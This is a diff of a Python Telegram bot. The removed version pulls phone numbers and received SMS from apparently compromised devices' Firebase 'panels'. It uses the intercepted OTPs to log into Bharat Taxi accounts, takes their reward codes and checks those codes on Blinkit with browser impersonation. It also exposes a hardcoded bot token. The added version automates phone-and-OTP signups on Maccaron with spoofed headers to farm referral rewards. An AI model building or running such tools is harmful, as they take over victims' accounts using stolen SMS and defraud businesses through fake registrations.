@@ -1,2388 +1,2135 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-VIEDIET PANEL MASTER  (@autoblinkitbot)
-=======================================
-- User force-joins the 2 VIEDIET channels before any access.
-- Each user gets a unique referral code.
-- 1 referral = +1 Firebase panel slot. Bulk add allowed up to slots.
-- User runs their own panels -> OTP -> login -> Amul/reward code extraction.
-- Every found code is AUTO-CHECKED on Blinkit using the admin's Blinkit
-  session (admin logs in once via /blinkitlogin) -> valid/invalid shown.
-- Privacy: har user apne codes/panels sirf khud dekh sakta hai — admin
-  sirf aggregate stats (counts) dekhta hai, codes ya panel URLs nahi.
-- Clean admin panel: dashboard, per-user stats, give extra slots.
-
-ENV:
-  BOT_TOKEN        : Telegram bot token (required)
-  ADMIN_ID         : comma separated admin ids (default: 8139558808)
-  DATA_DIR         : data folder (default: viediet_data)
-  OTP_TIMEOUT      : SMS poll seconds (default: 25)
-  NUMBER_DELAY     : gap between numbers (default: 2s)
-  PANEL_DELAY      : gap between panels (default: 2s)
-  TELEGRAM_API     : optional Telegram API mirror (e.g. https://tg.i-c-a.su)
-  BLINKIT_BASE_URL : Blinkit API host (default: https://api2.grofers.com)
-
-ADMIN COMMANDS:
-  /user <id|@user>       user stats (counts only — codes/panels private)
-  /give <id> <slots>     free slots
-  /addadmin <id>         kisi ko bhi admin access do (bot se hi)
-  /deladmin <id>         admin access hatao
-  /blinkitlogin          login Blinkit once (auto-check engine)
-  /check CODE            manual code check
-  /blinkit               checker stats
-
-REQUIRES: pip install curl_cffi pyTelegramBotAPI requests
+╔═══════════════════════════════════════════════════════════════════╗
+║    MACCARON REFERRAL BOT — STEP-BY-STEP SECURE EDITION             ║
+║                                                                   ║
+║   FLOW (har step locked, no shortcut):                            ║
+║     1. /start  ─────────────────────────── deep-link referral      ║
+║     2. Channel join  ──────────────────── FORCED, verify karke    ║
+║     3. Math CAPTCHA ───────────────────── solve karo, tab access   ║
+║     4. Maccaron refer code ────────────── apna code daalo          ║
+║     5. Phone → OTP → Signup ───────────── 1 registration = 1 point ║
+║                                                                   ║
+║   POINTS SYSTEM:                                                  ║
+║     • Naya user (captcha ke baad)  = +5 free points               ║
+║     • Har friend (join+captcha)    = +10 points                   ║
+║     • Har registration             = -1 point                     ║
+║                                                                   ║
+║   ANTI-COPY / ANTI-BYPASS:                                        ║
+║     • Step-by-step gate (join → captcha → code)                   ║
+║     • Self-referral block, duplicate referral block               ║
+║     • Referral credit SIRF captcha ke baad                        ║
+║     • Captcha 3 fail = 10 min lock                                ║
+║     • Personal refer code change with unique check                ║
+║                                                                   ║
+║   RUN:  python mc.py                                              ║
+║   TOKEN: token.txt (ya BOT_TOKEN env)                             ║
+║   ADMIN: admins.txt (ya ADMIN_IDS env)                            ║
+╚═══════════════════════════════════════════════════════════════════╝
 """
 
+import asyncio
+import logging
 import os
-import re
-import sys
-import time
-import json
-import html
-import uuid
 import random
+import re
 import sqlite3
+import string
 import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
+from concurrent.futures import ThreadPoolExecutor
+
 import requests
-import telebot
-import telebot.apihelper as apihelper
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telegram import (
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    Update,
+)
+from telegram.ext import (
+    Application,
+    CallbackQueryHandler,
+    CommandHandler,
+    ConversationHandler,
+    ContextTypes,
+    MessageHandler,
+    filters,
+)
 
-# ═══════════════════════════════════════════════════════════════
-# CONFIG
-# ═══════════════════════════════════════════════════════════════
+logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8773133018:AAEpo5FvlodjuPvthv2-iNoMMWNzFL02_uM")
-_raw_admins = os.getenv("ADMIN_ID", "8139558808").strip()
-ADMIN_IDS = [int(x) for x in _raw_admins.split(",") if x.strip().lstrip("+-").isdigit()]
-if not ADMIN_IDS:
-    ADMIN_IDS = [8139558808]
-ADMIN_IDS = list(dict.fromkeys(ADMIN_IDS))
-DATA_DIR = os.getenv("DATA_DIR", "viediet_data")
-OTP_TIMEOUT = int(os.getenv("OTP_TIMEOUT", "25"))
-NUMBER_DELAY = int(os.getenv("NUMBER_DELAY", "2"))
-PANEL_DELAY = int(os.getenv("PANEL_DELAY", "2"))
-
-# Coloured buttons: style (primary/danger/success) is standard Telegram Bot API 8+.
-# icon_custom_emoji_id needs the bot owner to have Premium / purchased usernames —
-# Coloured buttons: style (primary/success/danger) har client pe color deta hai.
-# icon_custom_emoji_id ke liye bot owner ke paas Telegram Premium / purchased
-# username hona chahiye — nahi hai toh USE_CUSTOM_EMOJI=0 kar do.
-USE_CUSTOM_EMOJI = os.getenv("USE_CUSTOM_EMOJI", "0") == "1"
-
-# Custom emoji IDs (Telegram built-in set)
-EMO_BLUE = "5373141891321699086"
-EMO_RED = "5370810157871667232"
-EMO_GREEN = "5471984997361523302"
-
-# ═══════════════════════════════════════════════════════════════
-# BLINKIT COUPON CHECKER  (merged from blinkitcheck.py)
-# ═══════════════════════════════════════════════════════════════
-
-BLINKIT_BASE_URL = os.getenv("BLINKIT_BASE_URL", "https://api2.grofers.com")
-BLINKIT_SESSION_FILE = os.path.join(DATA_DIR, "blinkit_session.json")
-BLINKIT_VALID_FILE = os.path.join(DATA_DIR, "blinkit_valid.txt")
-
-try:
-    from curl_cffi import requests as cffi_requests
-    CFFI_OK = True
-    # Blinkit TLS fingerprint check karta hai — Chrome impersonation zaroori
-    _cffi_session = cffi_requests.Session(impersonate="chrome110", verify=False)
-except Exception:
-    cffi_requests = None
-    _cffi_session = None
-    CFFI_OK = False
-
-_blinkit_lock = threading.Lock()
-BLINKIT_STATS = {"checked": 0, "valid": 0, "potential": 0, "invalid": 0, "errors": 0}
-
-_FIXED_DEVICE_ID = "".join(random.choices("0123456789abcdef", k=16))
-_FIXED_SESSION_UUID = str(uuid.uuid4())
-_FIXED_ADV_ID = str(uuid.uuid4())
-
-# ═══════════════════════════════════════════════════════════════
-# FORCE JOIN CHANNELS   (channel/group)
-# ═══════════════════════════════════════════════════════════════
-
-FORCE_JOIN = [
-    ("Channel", "@viedietlooters", "https://t.me/viedietlooters"),
-    ("Group", "@viedietbackup", "https://t.me/viedietbackup"),
-]
-
-# ═══════════════════════════════════════════════════════════════
-# BHARAT TAXI API CONFIG  (verified from amu.py)
-# ═══════════════════════════════════════════════════════════════
-
-BHARAT_SEND_OTP_URL = os.getenv("BHARAT_SEND_OTP_URL", "https://api.c2.moving.tech/pilot/app/v2/auth")
-BHARAT_VERIFY_OTP_URL = os.getenv("BHARAT_VERIFY_OTP_URL", "https://api.c2.moving.tech/pilot/app/v2/auth/{auth_id}/verify")
-BHARAT_REWARDS_URL = os.getenv("BHARAT_REWARDS_URL", "https://api.c2.moving.tech/pilot/app/v2/rewards")
-BHARAT_APP_PACKAGE = "in.mobility.bharatTaxi"
-BHARAT_CLIENT_VERSION = "0.0.28"
-BHARAT_USER_AGENT = "okhttp/4.12.0"
-
-os.makedirs(DATA_DIR, exist_ok=True)
-DB_PATH = os.path.join(DATA_DIR, "viediet.db")
-
-BOT = telebot.TeleBot(BOT_TOKEN) if BOT_TOKEN else None
-BOT_USERNAME = None
-
-BRAND = "🚕 <b>VIEDIET</b> PANEL MASTER"
-FOOTER = "\n\n🤖 Made by <b>viediet</b>"
-
-# ═══════════════════════════════════════════════════════════════
-# DATABASE
-# ═══════════════════════════════════════════════════════════════
-
-_db_lock = threading.Lock()
-_processing = set()
-_check_cache = {}
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
 
-def _db():
-    con = sqlite3.connect(DB_PATH, timeout=30)
-    con.execute("PRAGMA journal_mode=WAL")
-    return con
-
-
-def init_db():
-    with _db_lock:
-        con = _db()
+def _load_token():
+    t = os.getenv("BOT_TOKEN").strip()
+    if not t:
         try:
-            con.executescript("""
-                CREATE TABLE IF NOT EXISTS users (
-                    user_id INTEGER PRIMARY KEY,
-                    username TEXT,
-                    first_name TEXT,
-                    refer_code TEXT UNIQUE,
-                    referred_by INTEGER,
-                    referrals_count INTEGER DEFAULT 0,
-                    free_slots INTEGER DEFAULT 0,
-                    total_codes INTEGER DEFAULT 0,
-                    created_at REAL,
-                    last_active REAL
-                );
-                CREATE TABLE IF NOT EXISTS panels (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    user_id INTEGER,
-                    url TEXT,
-                    added_at REAL
-                );
-                CREATE TABLE IF NOT EXISTS referrals (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    referrer_id INTEGER,
-                    referred_id INTEGER,
-                    created_at REAL
-                );
-                CREATE TABLE IF NOT EXISTS results (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    user_id INTEGER,
-                    panel_url TEXT,
-                    device_id TEXT,
-                    mobile TEXT,
-                    status TEXT,
-                    codes TEXT,
-                    ts REAL
-                );
-                CREATE TABLE IF NOT EXISTS admins (
-                    user_id INTEGER PRIMARY KEY,
-                    added_by INTEGER,
-                    created_at REAL
-                );
-                CREATE INDEX IF NOT EXISTS idx_panels_user ON panels(user_id);
-                CREATE INDEX IF NOT EXISTS idx_results_user ON results(user_id);
-            """)
-            for aid in ADMIN_IDS:
-                con.execute(
-                    "INSERT OR IGNORE INTO admins(user_id, added_by, created_at) VALUES(?,?,?)",
-                    (aid, aid, time.time()))
-            con.commit()
-        finally:
-            con.close()
+            t = open(os.path.join(BASE_DIR, "token.txt"), encoding="utf-8").read().strip()
+        except Exception:
+            t = ""
+    if not t:
+        t = ""
+    return t
+
+
+def _load_admins():
+    ids = [int(x) for x in os.getenv("ADMIN_IDS", "1364476174").split(",") if x.strip().isdigit()]
+    if not ids:
+        try:
+            for line in open(os.path.join(BASE_DIR, "admins.txt"), encoding="utf-8"):
+                line = line.strip()
+                if line.isdigit():
+                    ids.append(int(line))
+        except Exception:
+            pass
+    return ids
+
+
+# ================== CONFIG ==================
+BOT_TOKEN = _load_token()
+BOT_USERNAME = os.getenv("BOT_USERNAME", "Viediet_MACCARON_bot")     # without @
+ADMIN_IDS = _load_admins()
+
+# default referral used when admin runs /auto without their own Maccaron code
+DEFAULT_REFERRAL = "RAND4FE6AFDB"
 
 
 def is_admin(user_id):
-    if user_id in ADMIN_IDS:
-        return True
-    with _db_lock:
-        con = _db()
-        try:
-            row = con.execute("SELECT 1 FROM admins WHERE user_id=?", (user_id,)).fetchone()
-            return row is not None
-        finally:
-            con.close()
+    return str(user_id) in [str(a) for a in ADMIN_IDS]
 
 
-def add_admin(user_id, added_by):
-    with _db_lock:
-        con = _db()
-        try:
-            con.execute(
-                "INSERT OR REPLACE INTO admins(user_id, added_by, created_at) VALUES(?,?,?)",
-                (user_id, added_by, time.time()))
-            con.commit()
-        finally:
-            con.close()
-
-
-def remove_admin(user_id):
-    with _db_lock:
-        con = _db()
-        try:
-            con.execute("DELETE FROM admins WHERE user_id=?", (user_id,))
-            con.commit()
-        finally:
-            con.close()
-
-
-def list_admins():
-    with _db_lock:
-        con = _db()
-        try:
-            rows = con.execute("SELECT user_id FROM admins ORDER BY created_at DESC").fetchall()
-            return [r[0] for r in rows]
-        finally:
-            con.close()
-
-
-def ensure_user(user_id, username="", first_name="", referred_by=None):
-    with _db_lock:
-        con = _db()
-        try:
-            row = con.execute("SELECT user_id FROM users WHERE user_id=?", (user_id,)).fetchone()
-            now = time.time()
-            if row:
-                con.execute("UPDATE users SET last_active=?, username=?, first_name=? WHERE user_id=?",
-                            (now, username or "", first_name or "", user_id))
-                con.commit()
-                return False
-            code = make_refer_code(user_id)
-            con.execute(
-                "INSERT INTO users(user_id, username, first_name, refer_code, referred_by, created_at, last_active)"
-                " VALUES(?,?,?,?,?,?,?)",
-                (user_id, username or "", first_name or "", code, referred_by, now, now),
-            )
-            con.commit()
-            return True
-        finally:
-            con.close()
-
-
-def make_refer_code(user_id):
-    chars = "0123456789abcdefghijklmnopqrstuvwxyz"
-    n = user_id
-    s = ""
-    while n:
-        s = chars[n % 36] + s
-        n //= 36
-    return ("VIE" + s.upper()[-5:].zfill(5))
-
-
-def get_user(user_id):
-    with _db_lock:
-        con = _db()
-        try:
-            return con.execute("SELECT * FROM users WHERE user_id=?", (user_id,)).fetchone()
-        finally:
-            con.close()
-
-
-def user_slots(user_id):
-    u = get_user(user_id)
-    if not u:
-        return 0, 0
-    with _db_lock:
-        con = _db()
-        try:
-            used = con.execute("SELECT COUNT(*) FROM panels WHERE user_id=?", (user_id,)).fetchone()[0]
-        finally:
-            con.close()
+def points_display(user_id):
     if is_admin(user_id):
-        return 10 ** 6, used  # admin = unlimited panels
-    refs = u[5] or 0  # referrals_count
-    free = u[6] or 0  # free_slots
-    return refs + free, used
-
-
-def slots_display(used, total):
-    return "∞" if total >= 10 ** 6 else f"{used}/{total}"
-
-
-def add_referral(referrer_id, referred_id):
-    with _db_lock:
-        con = _db()
-        try:
-            dup = con.execute("SELECT 1 FROM referrals WHERE referrer_id=? AND referred_id=?",
-                              (referrer_id, referred_id)).fetchone()
-            if dup:
-                return False
-            con.execute("INSERT INTO referrals(referrer_id, referred_id, created_at) VALUES(?,?,?)",
-                        (referrer_id, referred_id, time.time()))
-            con.execute("UPDATE users SET referrals_count=referrals_count+1 WHERE user_id=?",
-                        (referrer_id,))
-            con.commit()
-            return True
-        finally:
-            con.close()
-
-
-def add_panels(user_id, urls):
-    total, used = user_slots(user_id)
-    available = max(0, total - used)
-    with _db_lock:
-        con = _db()
-        try:
-            existing = set(r[0] for r in con.execute(
-                "SELECT url FROM panels WHERE user_id=?", (user_id,)).fetchall())
-        finally:
-            con.close()
-    added, rejected = [], []
-    for u in urls:
-        if u in existing:
-            rejected.append(u)
-            continue
-        if len(added) >= available:
-            rejected.append(u)
-            continue
-        with _db_lock:
-            con = _db()
-            try:
-                con.execute("INSERT INTO panels(user_id, url, added_at) VALUES(?,?,?)",
-                            (user_id, u, time.time()))
-                con.commit()
-            finally:
-                con.close()
-        existing.add(u)
-        added.append(u)
-    return added, rejected, available
-
-
-def get_user_panels(user_id):
-    with _db_lock:
-        con = _db()
-        try:
-            return [r[0] for r in con.execute(
-                "SELECT url FROM panels WHERE user_id=? ORDER BY id ASC", (user_id,)).fetchall()]
-        finally:
-            con.close()
-
-
-def log_result(user_id, panel_url, device_id, mobile, status, codes):
-    with _db_lock:
-        con = _db()
-        try:
-            con.execute(
-                "INSERT INTO results(user_id, panel_url, device_id, mobile, status, codes, ts)"
-                " VALUES(?,?,?,?,?,?,?)",
-                (user_id, panel_url, device_id, mobile, status, json.dumps(codes), time.time()),
-            )
-            if codes:
-                con.execute("UPDATE users SET total_codes=total_codes+? WHERE user_id=?",
-                            (len(codes), user_id))
-            con.commit()
-        finally:
-            con.close()
-
-
-def seen_code(code):
-    with _db_lock:
-        con = _db()
-        try:
-            row = con.execute("SELECT 1 FROM results WHERE codes LIKE ? LIMIT 1", ("%" + code + "%",)).fetchone()
-            return row is not None
-        finally:
-            con.close()
-
-
-def top_users(limit=10):
-    with _db_lock:
-        con = _db()
-        try:
-            return con.execute(
-                "SELECT user_id, username, first_name, total_codes, referrals_count, free_slots"
-                " FROM users ORDER BY total_codes DESC LIMIT ?", (limit,)).fetchall()
-        finally:
-            con.close()
-
-
-def find_user(keyword):
-    keyword = keyword.strip().lstrip("@")
-    with _db_lock:
-        con = _db()
-        try:
-            if keyword.isdigit():
-                return con.execute("SELECT * FROM users WHERE user_id=?", (int(keyword),)).fetchone()
-            row = con.execute("SELECT * FROM users WHERE username=? COLLATE NOCASE", (keyword,)).fetchone()
-            if not row:
-                row = con.execute("SELECT * FROM users WHERE refer_code=? COLLATE NOCASE", (keyword,)).fetchone()
-            return row
-        finally:
-            con.close()
-
-
-def give_slots(user_id, n):
-    with _db_lock:
-        con = _db()
-        try:
-            con.execute("UPDATE users SET free_slots=free_slots+? WHERE user_id=?", (n, user_id))
-            con.commit()
-        finally:
-            con.close()
-
-
-def db_stats():
-    with _db_lock:
-        con = _db()
-        try:
-            users = con.execute("SELECT COUNT(*) FROM users").fetchone()[0]
-            panels = con.execute("SELECT COUNT(*) FROM panels").fetchone()[0]
-            codes = con.execute("SELECT COUNT(*) FROM results WHERE codes<>'[]'").fetchone()[0]
-            today0 = time.time() - 86400
-            today = con.execute(
-                "SELECT COUNT(*) FROM results WHERE codes<>'[]' AND ts>?", (today0,)).fetchone()[0]
-            return users, panels, codes, today
-        finally:
-            con.close()
-
-
-# ═══════════════════════════════════════════════════════════════
-# FORCE JOIN
-# ═══════════════════════════════════════════════════════════════
-
-def has_joined(user_id):
-    for _, chat, _ in FORCE_JOIN:
-        try:
-            m = BOT.get_chat_member(chat, user_id)
-            if m.status in ("creator", "administrator", "member"):
-                continue
-            return False
-        except Exception:
-            return False
-    return True
-
-
-def force_join_markup():
-    kb = InlineKeyboardMarkup(row_width=1)
-    for label, _, link in FORCE_JOIN:
-        kb.add(url_btn(f"🔴 JOIN {label.upper()}", link, style="danger", icon=EMO_RED))
-    kb.add(btn("✅ I HAVE JOINED", "check_join", style="success", icon=EMO_GREEN))
-    return kb
-
-
-def send_force_join(chat_id):
-    try:
-        BOT.send_message(
-            chat_id,
-            f"{BRAND}\n\n"
-            f"🔒 <b>ACCESS DENIED</b>\n\n"
-            f"Bot use karne ke liye dono ko join karna zaroori hai:\n\n"
-            f"1️⃣ <b>Channel</b> ➜ <a href='https://t.me/viedietlooters'>viedietlooters</a>\n"
-            f"2️⃣ <b>Group</b> ➜ <a href='https://t.me/viedietbackup'>viedietbackup</a>\n\n"
-            f"✅ Dono join karne ke baad <b>'I HAVE JOINED'</b> dabao." + FOOTER,
-            parse_mode="HTML",
-            disable_web_page_preview=True,
-            reply_markup=force_join_markup(),
-        )
-    except Exception:
-        pass
-
-
-def check_and_reply(chat_id, user_id):
-    if has_joined(user_id) or is_admin(user_id):
-        send_home(chat_id, user_id)
-    else:
-        send_force_join(chat_id)
-
-
-# ═══════════════════════════════════════════════════════════════
-# UI
-# ═══════════════════════════════════════════════════════════════
-
-def btn(text, data, style=None, icon=None):
-    if not data:
-        raise ValueError("callback_data required")
-    kwargs = {}
-    if style:
-        kwargs["style"] = style
-    if USE_CUSTOM_EMOJI and icon:
-        kwargs["icon_custom_emoji_id"] = icon
-    return InlineKeyboardButton(text, callback_data=data, **kwargs)
-
-
-def url_btn(text, url, style=None, icon=None):
-    kwargs = {}
-    if style:
-        kwargs["style"] = style
-    if USE_CUSTOM_EMOJI and icon:
-        kwargs["icon_custom_emoji_id"] = icon
-    return InlineKeyboardButton(text, url=url, **kwargs)
-
-
-def home_markup(is_admin=False):
-    kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(btn("📂 ADD PANEL", "add_panel", style="primary", icon=EMO_BLUE))
-    kb.add(btn("🔎 CHECK PANELS", "check_panels", style="primary", icon=EMO_BLUE))
-    kb.add(btn("🎯 RUN CODES", "run_menu", style="primary", icon=EMO_BLUE))
-    kb.add(btn("📊 MY STATS", "my_stats", style="primary", icon=EMO_BLUE))
-    kb.add(btn("🔗 REFER & EARN", "refer", style="success", icon=EMO_GREEN))
-    if is_admin:
-        kb.add(btn("🛠 ADMIN PANEL", "admin_menu", style="danger", icon=EMO_RED))
-    return kb
-
-
-def send_home(chat_id, user_id):
+        return "∞ (unlimited)"
     u = get_user(user_id)
-    name = (u[2] or "user") if u else "user"
-    code = u[3] if u else ""
-    total, used = user_slots(user_id)
-    link = f"https://t.me/{BOT_USERNAME or 'autoblinkitbot'}?start={code}"
-    BOT.send_message(
-        chat_id,
-        f"{BRAND}\n\n"
-        f"👤 <b>{html.escape(name)}</b>\n"
-        f"🔗 Refer: <code>{link}</code>\n"
-        f"📂 Panels: <b>{slots_display(used, total)}</b> slots\n"
-        f"🎁 Codes Found: <b>{u[7] if u else 0}</b>\n\n"
-        f"Select karo 👇" + FOOTER,
-        parse_mode="HTML",
-        reply_markup=home_markup(is_admin(user_id)),
-    )
+    return str(u["points"]) if u else "0"
 
-
-def back_home_markup():
-    kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(btn("🏠 HOME", "home", style="primary", icon=EMO_BLUE))
-    return kb
-
-
-# ═══════════════════════════════════════════════════════════════
-# FIREBASE HELPERS
-# ═══════════════════════════════════════════════════════════════
-
-def fb_get_sync(path, panel_url, timeout=8):
-    url = panel_url.rstrip("/") + "/" + path.lstrip("/")
-    if not url.endswith(".json"):
-        url += ".json"
-    try:
-        resp = requests.get(url, timeout=timeout)
-        if resp.status_code == 200:
-            try:
-                return resp.json()
-            except Exception:
-                return resp.text
-    except Exception:
-        pass
-    return None
-
-
-def extract_all_nums(*dicts):
-    nums = []
-    keys_to_check = ["sim1Number", "sim2Number", "numberSim1", "numberSim2",
-                     "mobNo", "phoneNumber", "phone", "mobile"]
-    for d in dicts:
-        if not isinstance(d, dict):
-            continue
-        for k in keys_to_check:
-            val = str(d.get(k, ""))
-            if val and len(re.sub(r"\D", "", val)) >= 10:
-                nums.append(re.sub(r"\D", "", val)[-10:])
-    return list(set(nums))
-
-
-def refer_numbers(sim):
-    nums, seen = [], set()
-    for key in ("sim1Number", "sim2Number"):
-        val = str(sim.get(key, "") if isinstance(sim, dict) else "").strip()
-        if val.startswith("+91"):
-            val = val[3:]
-        elif val.startswith("91"):
-            val = val[2:]
-        val = re.sub(r"\D", "", val)
-        if len(val) == 10 and val not in seen:
-            seen.add(val)
-            nums.append(val)
-    return nums
-
-
-def _unwrap(d):
-    while isinstance(d, dict) and list(d.keys()) == ["data"] and isinstance(d["data"], dict):
-        d = d["data"]
-    return d
-
-
-PHONE_KEYS = ("mobile", "mobileno", "mobile_number", "mobileNumber", "mobile_no",
-              "mob", "mobno", "phone", "phoneNumber", "phone_number", "contact",
-              "whatsapp", "number", "sim1", "sim2", "sim1number", "sim2number",
-              "mobileNumber2")
-
-
-def deep_find_mobiles(*nodes):
-    nums, seen = [], set()
-
-    def rec(node):
-        if isinstance(node, dict):
-            for k, v in node.items():
-                if isinstance(v, str) and k.lower() in PHONE_KEYS:
-                    clean = re.sub(r"\D", "", v)
-                    if len(clean) == 10 and clean not in seen:
-                        seen.add(clean)
-                        nums.append(clean)
-                elif isinstance(v, (dict, list)):
-                    rec(v)
-        elif isinstance(node, list):
-            for item in node:
-                rec(item)
-
-    for n in nodes:
-        rec(n)
-    return nums
-
-
-# SMS node ke possible paths (har panel ki apni jagah — lorefer v3 se)
-SMS_PATHS = [
-    "user_sms/{dev}",            # NV panels: received SMS (tillu2, chfjfj, muajob)
-    "All_Users/sms/{dev}",       # spy25-style: received SMS push keys
-    "All_Users/Data/{dev}/sms",  # NV command node (outgoing — filter karna)
-    "sms/{dev}",                 # kuch root pe direct 'sms'
-    "All_Users/user_sms/{dev}",  # nested
+# ── Forced channels (bot ko channel ka admin/member hona zaroori) ──
+REQUIRED_CHANNELS = [
+    {"chat_id": "@viedietlooters", "title": "VIEDIET LOOTERS"},
 ]
 
-NON_DEVICE_KEYS = {"DeviceInfo", "Admin", "commands", "Number", "numbers", "action", "sms"}
+# ── Points system ──
+INITIAL_POINTS = 5            # naye user ko captcha ke baad free points
+REFERRAL_POINTS = 10          # har confirmed friend = +10 points (10 uses)
+POINTS_PER_USE = 1            # har registration me points kharch
+
+# ── Captcha ──
+CAPTCHA_MAX_FAILS = 3
+CAPTCHA_LOCK_SECONDS = 600    # 10 min lock after 3 wrong attempts
+
+# ── Maccaron API ──
+GRAPHQL_URL = "https://graphql.maccaron.in/graphql/"
+HEADERS = {
+    "accept": "application/graphql-response+json,application/json;q=0.9",
+    "accept-language": "en-US,en;q=0.9",
+    "cache-control": "no-cache",
+    "content-type": "application/json",
+    "origin": "https://maccaron.in",
+    "pragma": "no-cache",
+    "priority": "u=1, i",
+    "referer": "https://maccaron.in/",
+    "sec-ch-ua": '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
+    "sec-ch-ua-mobile": "?0",
+    "sec-ch-ua-platform": '"Windows"',
+    "sec-fetch-dest": "empty",
+    "sec-fetch-mode": "cors",
+    "sec-fetch-site": "same-site",
+    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36",
+}
+
+IO_POOL = ThreadPoolExecutor(max_workers=20)
+API_SEMAPHORE = threading.Semaphore(5)
+
+DB_PATH = os.path.join(BASE_DIR, "maccaron.db")
+
+# ── Conversation states ──
+CHANNEL_CHECK, CAPTCHA, REFERRAL, PHONE, OTP, CHANGE_MC, CHANGE_PC = range(7)
+
+# ── Colored button emoji IDs (Bot API 7.11+) ──
+# (unused, kept for reference)
+EMOJI_BLUE = "5373141891321699086"
+EMOJI_RED = "5370810157871667232"
+EMOJI_GREEN = "5471984997361523302"
+
+_db_lock = threading.Lock()
 
 
-def flatten_sms(value, depth=0):
-    """Panels alag-alag SMS structure store karte hain — sab handle karo."""
+# ════════════════════════════════════════════════════════════════════
+#  COLORED BUTTON HELPER (style + icon via api_kwargs)
+# ════════════════════════════════════════════════════════════════════
+def col(text, cdata=None, url=None, style=None, emoji=None):
+    """Colored InlineKeyboardButton — Telegram Bot API 7.11+ style.
+    Valid styles: primary, success, danger (NOT secondary)."""
+    api = {}
+    if style in ("primary", "success", "danger"):
+        api["style"] = style
+    if emoji:
+        api["icon_custom_emoji_id"] = emoji
+    kwargs = {}
+    if cdata is not None:
+        kwargs["callback_data"] = cdata
+    if url:
+        kwargs["url"] = url
+    return InlineKeyboardButton(text, **kwargs, api_kwargs=api or None)
+
+
+def blue(text, cdata=None, url=None):
+    return col(text, cdata=cdata, url=url, style="primary")
+
+
+def red(text, cdata=None, url=None):
+    return col(text, cdata=cdata, url=url, style="danger")
+
+
+def green(text, cdata=None, url=None):
+    return col(text, cdata=cdata, url=url, style="success")
+
+
+def grey(text, cdata=None, url=None):
+    return col(text, cdata=cdata, url=url)
+
+
+# ════════════════════════════════════════════════════════════════════
+#  DATABASE
+# ════════════════════════════════════════════════════════════════════
+def init_db():
+    with _db_lock:
+        conn = sqlite3.connect(DB_PATH, timeout=30)
+        conn.execute("PRAGMA journal_mode=WAL")
+        conn.executescript(
+            """
+            CREATE TABLE IF NOT EXISTS users(
+                user_id TEXT PRIMARY KEY,
+                username TEXT DEFAULT '',
+                full_name TEXT DEFAULT '',
+                maccaron_code TEXT DEFAULT '',
+                personal_code TEXT UNIQUE,
+                referred_by TEXT DEFAULT '',
+                points INTEGER DEFAULT 0,
+                referral_count INTEGER DEFAULT 0,
+                captcha_ok INTEGER DEFAULT 0,
+                captcha_fails INTEGER DEFAULT 0,
+                captcha_locked_until REAL DEFAULT 0,
+                channel_ok INTEGER DEFAULT 0,
+                phone TEXT DEFAULT '',
+                state TEXT DEFAULT 'new',
+                last_active REAL DEFAULT 0,
+                created_at REAL,
+                updated_at REAL
+            );
+
+            CREATE TABLE IF NOT EXISTS referrals(
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                referrer_id TEXT,
+                referred_id TEXT UNIQUE,
+                credited INTEGER DEFAULT 0,
+                created_at REAL
+            );
+
+            CREATE TABLE IF NOT EXISTS results(
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                phone TEXT, name TEXT, email TEXT, status TEXT,
+                details TEXT, referral_code TEXT, user_id TEXT, ts REAL
+            );
+
+            CREATE TABLE IF NOT EXISTS user_phones(
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_id TEXT, phone TEXT, first_seen REAL, last_seen REAL,
+                status TEXT, referral_code TEXT, count INTEGER DEFAULT 1,
+                UNIQUE(user_id, phone)
+            );
+            """
+        )
+        conn.commit()
+        conn.close()
+
+
+def _conn():
+    conn = sqlite3.connect(DB_PATH, timeout=30)
+    conn.row_factory = sqlite3.Row
+    return conn
+
+
+def _b36(n):
+    chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    n = int(n)
+    s = ""
+    while n:
+        n, r = divmod(n, 36)
+        s = chars[r] + s
+    return s or "0"
+
+
+def default_personal_code(user_id):
+    return "VD" + _b36(user_id)
+
+
+# ── user helpers ──
+def get_user(user_id):
+    with _db_lock:
+        conn = _conn()
+        try:
+            row = conn.execute("SELECT * FROM users WHERE user_id=?", (str(user_id),)).fetchone()
+            return dict(row) if row else None
+        finally:
+            conn.close()
+
+
+def get_user_by_code(code):
+    if not code:
+        return None
+    with _db_lock:
+        conn = _conn()
+        try:
+            row = conn.execute("SELECT * FROM users WHERE personal_code=?", (str(code).strip(),)).fetchone()
+            return dict(row) if row else None
+        finally:
+            conn.close()
+
+
+def create_user(user_id, username, full_name, referred_by=""):
+    with _db_lock:
+        conn = _conn()
+        try:
+            now = time.time()
+            conn.execute(
+                "INSERT OR IGNORE INTO users(user_id, username, full_name, personal_code, referred_by, created_at, updated_at) "
+                "VALUES(?,?,?,?,?,?,?)",
+                (str(user_id), username or "", full_name or "", default_personal_code(user_id),
+                 str(referred_by or ""), now, now))
+            conn.commit()
+        finally:
+            conn.close()
+    return get_user(user_id)
+
+
+def update_user(user_id, **fields):
+    if not fields:
+        return
+    fields = {k: v for k, v in fields.items() if v is not None}
+    if not fields:
+        return
+    fields["updated_at"] = time.time()
+    sets = ", ".join(f"{k}=?" for k in fields)
+    with _db_lock:
+        conn = _conn()
+        try:
+            conn.execute(f"UPDATE users SET {sets} WHERE user_id=?",
+                         (*fields.values(), str(user_id)))
+            conn.commit()
+        finally:
+            conn.close()
+
+
+def _inc_field(user_id, field, n=1):
+    with _db_lock:
+        conn = _conn()
+        try:
+            conn.execute(f"UPDATE users SET {field} = {field} + ? , updated_at=? WHERE user_id=?",
